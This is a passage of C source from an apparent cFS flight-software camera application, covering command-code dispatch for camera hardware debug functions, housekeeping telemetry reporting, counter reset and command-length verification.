                CFE_EVS_SendEvent(CAM_INIT_I2C_ERR_EID,CFE_EVS_EventType_ERROR, "CAM App: I2C Failure");
            }
            else
            {
                state = CAM_init_spi();
                if (state != OS_SUCCESS)
                {   
                    CFE_EVS_SendEvent(CAM_INIT_SPI_ERR_EID,CFE_EVS_EventType_ERROR, "CAM App: SPI Failure"); 
                }
                else
                {  
                    CFE_EVS_SendEvent(CAM_HW_CHECK_EID, CFE_EVS_EventType_INFORMATION, "CAM App: Hardware Checked Out");
                }
            }
            break;

        /*
        **  Debug and Testing CC
        */
        case CAM_HWLIB_INIT_I2C_CC:
            CAM_init_i2c();
            break;
        case CAM_HWLIB_INIT_SPI_CC:
            CAM_init_spi();
            break;
        case CAM_HWLIB_CONFIG_CC:
            CAM_config();
            break;
        case CAM_HWLIB_JPEG_INIT_CC:
            CAM_jpeg_init();
            break;
        case CAM_HWLIB_YUV422_CC:
            CAM_yuv422();
            break;
        case CAM_HWLIB_JPEG_CC:
            CAM_jpeg();
            break;
        case CAM_HWLIB_SETUP_CC:
            CAM_setup();
            break;
        case CAM_HWLIB_SETSIZE_CC:
            CAM_setSize(CAM_AppData.Size);
            break;
        case CAM_HWLIB_CAPTURE_PREP_CC:
            CAM_capture_prep();
            break;
        case CAM_HWLIB_CAPTURE_CC:
            CAM_capture();
            break;
        case CAM_HWLIB_READ_PREP_CC:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.Exp_Pkt.msg_count = 0x0000;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CAM_read_prep((char*) &CAM_AppData.Exp_Pkt.data, (uint16*) &x);
            break;
        case CAM_HWLIB_READ_CC:
            x = 1;
            state = 1;
            CAM_fifo(&x, &state);
            break;

        /*
        ** Invalid Command Codes
        */
        default:
            OS_MutSemTake(CAM_AppData.data_mutex);
                CAM_AppData.HkTelemetryPkt.CommandErrorCount++;
            OS_MutSemGive(CAM_AppData.data_mutex);
            CFE_EVS_SendEvent(CAM_COMMAND_ERR_EID, CFE_EVS_EventType_ERROR, 
                "CAM App: invalid command code for packet MID = 0x%x CC = 0x%x", CFE_SB_MsgIdToValue(MsgId), CommandCode);
            break;
    }
    return;
} 

/* 
**  Name:  CAM_ReportHousekeeping                                             
**                                                                            
**  Purpose:                                                                  
**         This function is triggered in response to a task telemetry request 
**         from the housekeeping task. This function will gather the Apps     
**         telemetry, packetize it and send it to the housekeeping task via   
**         the software bus                                                   
*/
void CAM_ReportHousekeeping(void)
{
    OS_MutSemTake(CAM_AppData.data_mutex);
        CFE_SB_TimeStampMsg((CFE_MSG_Message_t *) &CAM_AppData.HkTelemetryPkt);
        CFE_SB_TransmitMsg((CFE_MSG_Message_t *) &CAM_AppData.HkTelemetryPkt, true);
    OS_MutSemGive(CAM_AppData.data_mutex);
    return;
} 

/*
**  Name:  CAM_ResetCounters                                               
**                                                                            
**  Purpose:                                                                  
**         This function resets all the global counter variables that are    
**         part of the task telemetry.                                        
*/
void CAM_ResetCounters(void)
{
    /* Status of commands processed by the CAM App */
    CAM_AppData.HkTelemetryPkt.CommandCount       = 0;
    CAM_AppData.HkTelemetryPkt.CommandErrorCount  = 0;
    CFE_EVS_SendEvent(CAM_COMMANDRST_INF_EID, CFE_EVS_EventType_INFORMATION, "CAM App: RESET Counters Command");
    return;
} 

/*
** CAM_VerifyCmdLength() -- Verify command packet length                                                                                              
*/
bool CAM_VerifyCmdLength(CFE_MSG_Message_t * msg, uint16 ExpectedLength)
{     
    bool result = true;
    size_t ActualLength = 0;
    CFE_SB_MsgId_t MessageID = CFE_SB_INVALID_MSG_ID; 
    CFE_MSG_FcnCode_t CommandCode = 0;

    /*
    ** Verify the command packet length.
    */
    CFE_MSG_GetSize(msg, &ActualLength);
    if (ExpectedLength != ActualLength)
    {
        CFE_MSG_GetMsgId(msg, &MessageID);
        CFE_MSG_GetFcnCode(msg, &CommandCode);

        CFE_EVS_SendEvent(CAM_LEN_ERR_EID, CFE_EVS_EventType_ERROR,
           "Invalid msg length: ID = 0x%X CC = %d Len = %d Expected = %d",
              CFE_SB_MsgIdToValue(MessageID), CommandCode, ActualLength, ExpectedLength);

        result = false;
        CAM_AppData.HkTelemetryPkt.CommandErrorCount++;
    }

    return(result);
} 

